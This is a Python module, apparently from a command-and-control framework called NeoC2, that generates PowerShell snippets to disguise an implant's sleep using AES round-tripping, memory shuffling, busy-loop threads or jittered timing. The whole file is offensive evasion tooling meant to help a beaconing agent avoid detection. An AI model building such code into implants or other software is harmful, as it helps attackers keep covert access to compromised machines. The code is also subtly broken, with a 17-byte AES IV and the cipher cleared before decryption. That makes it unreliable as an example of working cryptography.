import os
import random
import string
import time
import threading
from core.config import NeoC2Config

class SleepObfuscation:
    def __init__(self, config):
        self.config = config
        self.obfuscation_techniques = [
            "encryption",
            "memory_shuffling",
            "thread_obfuscation",
            "timing_obfuscation"
        ]
    
    def obfuscate(self, sleep_time):
        technique = random.choice(self.obfuscation_techniques)
        
        if technique == "encryption":
            return self._encryption_obfuscation(sleep_time)
        elif technique == "memory_shuffling":
            return self._memory_shuffling_obfuscation(sleep_time)
        elif technique == "thread_obfuscation":
            return self._thread_obfuscation(sleep_time)
        elif technique == "timing_obfuscation":
            return self._timing_obfuscation(sleep_time)
        
        return sleep_time
    
    def _encryption_obfuscation(self, sleep_time):
        return f'''
# Encryption-based Sleep Obfuscation
$sleepTime = {sleep_time}

# Encrypt sleep time
$key = [System.Text.Encoding]::UTF8.GetBytes("ThisIsASecretKey")
$iv = [System.Text.Encoding]::UTF8.GetBytes("InitializationVec")

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv

$encryptor = $aes.CreateEncryptor()
$ms = [System.IO.MemoryStream]::new()
$cs = [System.Security.Cryptography.CryptoStream]::new($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$sw = [System.IO.StreamWriter]::new($cs)
$sw.Write($sleepTime)
$sw.Close()
$cs.Close()
$ms.Close()
$aes.Clear()

$encryptedSleepTime = [System.Convert]::ToBase64String($ms.ToArray())

# Decrypt sleep time
$encryptedBytes = [System.Convert]::FromBase64String($encryptedSleepTime)
$ms = [System.IO.MemoryStream]::new($encryptedBytes)
$cs = [System.Security.Cryptography.CryptoStream]::new($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = [System.IO.StreamReader]::new($cs)
$decryptedSleepTime = $sr.ReadToEnd()
$sr.Close()
$cs.Close()
$ms.Close()

# Sleep
Start-Sleep -Seconds $decryptedSleepTime
'''
    
    def _memory_shuffling_obfuscation(self, sleep_time):
        return f'''
# Memory Shuffling-based Sleep Obfuscation
$sleepTime = {sleep_time}

# Create memory buffer
$bufferSize = 1024 * 1024  # 1MB
$buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)

# Fill buffer with random data
$random = [System.Random]::new()
for ($i = 0; $i -lt $bufferSize; $i++) {{
    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $random.Next(0, 256))
}}

# Shuffle memory
for ($i = 0; $i -lt 1000; $i++) {{
    $index1 = $random.Next(0, $bufferSize)
    $index2 = $random.Next(0, $bufferSize)
    
    $temp = [System.Runtime.InteropServices.Marshal]::ReadByte($buffer, $index1)
    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $index1, [System.Runtime.InteropServices.Marshal]::ReadByte($buffer, $index2))
    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $index2, $temp)
}}

# Sleep in small intervals
$interval = $sleepTime / 10
for ($i = 0; $i -lt 10; $i++) {{
    Start-Sleep -Seconds $interval
    
    # Shuffle memory again
    for ($j = 0; $j -lt 100; $j++) {{
        $index1 = $random.Next(0, $bufferSize)
        $index2 = $random.Next(0, $bufferSize)
        
        $temp = [System.Runtime.InteropServices.Marshal]::ReadByte($buffer, $index1)
        [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $index1, [System.Runtime.InteropServices.Marshal]::ReadByte($buffer, $index2))
        [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $index2, $temp)
    }}
}}

# Free memory
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
'''
    
    def _thread_obfuscation(self, sleep_time):
        return f'''
# Thread-based Sleep Obfuscation
$sleepTime = {sleep_time}

# Create multiple threads
$threads = @()
for ($i = 0; $i -lt 5; $i++) {{
    $thread = [System.Threading.Thread]::new({{
        param($duration)
        $end = [System.DateTime]::Now.AddSeconds($duration)
        while ([System.DateTime]::Now -lt $end) {{
            # Do some useless work
            $x = 1
            for ($j = 0; $j -lt 1000; $j++) {{
                $x *= $j
            }}
        }}
    }})
    
    $threads += $thread
    $thread.Start($sleepTime / 5)
}}

# Wait for all threads to complete
foreach ($thread in $threads) {{
    $thread.Join()
}}
'''
    
    def _timing_obfuscation(self, sleep_time):
        return f'''
# Timing-based Sleep Obfuscation
$sleepTime = {sleep_time}

# Create a timer with random intervals
$timer = [System.Diagnostics.Stopwatch]::StartNew()
$end = $timer.Elapsed.TotalSeconds + $sleepTime

while ($timer.Elapsed.TotalSeconds -lt $end) {{
    # Random sleep interval
    $interval = [System.Random]::new().Next(100, 1000)
    Start-Sleep -Milliseconds $interval
    
    # Do some random work
    $x = 1
    for ($i = 0; $i -lt 100; $i++) {{
        $x *= $i
    }}
    
    # Adjust remaining time
    $remaining = $end - $timer.Elapsed.TotalSeconds
    if ($remaining -lt 0) {{
        break
    }}
}}

$timer.Stop()
'''
